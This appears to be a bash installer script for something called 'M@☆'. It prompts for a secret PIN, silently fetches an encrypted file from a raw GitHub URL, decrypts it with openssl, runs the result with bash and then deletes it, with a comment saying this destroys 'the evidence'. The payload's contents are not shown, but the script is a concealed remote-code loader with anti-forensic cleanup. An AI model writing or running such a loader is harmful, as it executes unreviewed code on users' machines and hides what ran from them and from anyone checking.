#!/bin/bash
clear
echo -e "\e[1;34m===========================================\e[0m"
echo -e "\e[1;36m     MASTERS M@☆ SYSTEM INSTALLER         \e[0m"
echo -e "\e[1;34m===========================================\e[0m"
echo ""
read -s -p $'\e[1;33mEnter VIP Install PIN: \e[0m' PIN
echo ""

# Create a secure, temporary execution file
_tmp=$(mktemp)

# Silently pull the locked payload and decrypt it directly into the temporary file
curl -sL "https://raw.githubusercontent.com/M-AT-STAR/SV/main/lckd_nstll" | openssl aes-256-cbc -d -a -pbkdf2 -pass pass:"$PIN" > "$_tmp" 2>/dev/null

# Verify decryption actually worked by checking if the script has our setup text
if grep -q "Initializing" "$_tmp"; then
    echo -e "\e[1;32m[+] PIN Accepted. Initializing M@☆ setup...\e[0m"
    sleep 1
    # Run the decrypted script safely
    bash "$_tmp"
    # Destroy the evidence immediately after it finishes
    rm -f "$_tmp"
else
    echo -e "\e[1;91m[!] INVALID PIN OR CORRUPT PAYLOAD. SELF-DESTRUCTING PROCESS.\e[0m"
    rm -f "$_tmp"
    exit 1
fi

